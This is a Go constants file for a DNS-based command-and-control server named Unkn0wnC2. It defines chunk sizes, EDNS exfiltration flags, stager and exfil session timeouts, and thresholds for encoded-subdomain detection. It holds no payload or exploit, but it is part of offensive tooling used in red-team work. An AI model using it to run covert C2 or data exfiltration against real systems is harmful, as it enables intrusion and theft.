// Package main defines constants used throughout the Unkn0wnC2 server.
// This centralizes magic numbers and configuration values for maintainability.
package main

import "time"

// DNS and Protocol Constants
const (
	// DNSChunkSize is the maximum chunk size for DNS transmission (safe for 512-byte UDP limit)
	// Calculation: 512 (UDP) - 125 (headers+question) - 6 (CHUNK| prefix) - 10 (TXT overhead) = ~370 bytes
	DNSChunkSize = 370

	// ExfilOptionCode is the EDNS(0) option code reserved for exfil metadata frames
	ExfilOptionCode uint16 = 65001

	// ExfilFlagHeader marks the metadata-only header frame
	ExfilFlagHeader = 0x01

	// ExfilFlagFinalChunk marks the final data chunk in a transfer
	ExfilFlagFinalChunk = 0x02

	// ExfilFlagComplete marks the completion frame sent after all chunks
	ExfilFlagComplete = 0x04

	// ExfilProtocolVersion is the current protocol revision for EDNS metadata frames
	ExfilProtocolVersion = 1

	// ExfilHeaderChunkIndex is the sentinel chunk index used for metadata-only frames
	ExfilHeaderChunkIndex uint32 = 0xFFFFFFFF

	// DNSLabelMaxLength is the maximum length for a single DNS label
	DNSLabelMaxLength = 62

	// DNSMaxDomainLength is the maximum total DNS domain name length
	DNSMaxDomainLength = 253
)

// Session and Timeout Constants
const (
	// StagerSessionTimeout is how long stager sessions remain active without activity
	StagerSessionTimeout = 3 * time.Hour

	// ExfilSessionTimeout is how long exfil sessions remain active without new chunks
	ExfilSessionTimeout = 15 * time.Minute

	// ExpectedResultTimeout is how long we wait for chunked results before cleanup
	// This timeout is reset with each chunk received, so long-running multi-hour
	// exfiltrations will not be cleaned up as long as chunks keep arriving.
	// Only cleaned up if NO chunks received for this duration.
	ExpectedResultTimeout = 1 * time.Hour

	// CleanupInterval is how often the cleanup goroutine runs
	CleanupInterval = 5 * time.Minute

	// RecentMessageTTL is how long we track message hashes for deduplication
	RecentMessageTTL = 30 * time.Second

	// TaskTimeout is how long before a sent task is considered failed
	TaskTimeout = 2 * time.Hour
)

// Task and Result Constants
const (
	// TaskCounterStart is the starting ID for task numbering
	TaskCounterStart = 1000

	// DomainTaskCounterStart is the starting ID for domain update tasks (D-prefixed)
	DomainTaskCounterStart = 0

	// ResultPreviewMaxLength is the maximum length of result previews in logs
	ResultPreviewMaxLength = 200

	// MaxCommandLength is the default maximum command length
	MaxCommandLength = 400
)

// Pattern Analysis Constants
const (
	// LegitimateSubdomainMaxLength is the max length for legitimate-looking subdomains
	LegitimateSubdomainMaxLength = 20

	// Base36MinLength is the minimum length for Base36-encoded data
	Base36MinLength = 30

	// Base36LongStringThreshold is the threshold for "definitely encoded" detection
	Base36LongStringThreshold = 50

	// UnixTimestampMinLength is the minimum length of Unix timestamps
	UnixTimestampMinLength = 10

	// UnixTimestampMaxLength is the maximum length of Unix timestamps
	UnixTimestampMaxLength = 11
)

// Time Format Constants
const (
	// TimeFormatShort is the short time format for display
	TimeFormatShort = "15:04:05"

	// TimeFormatLong is the long time format for display
	TimeFormatLong = "2006-01-02 15:04:05"
)
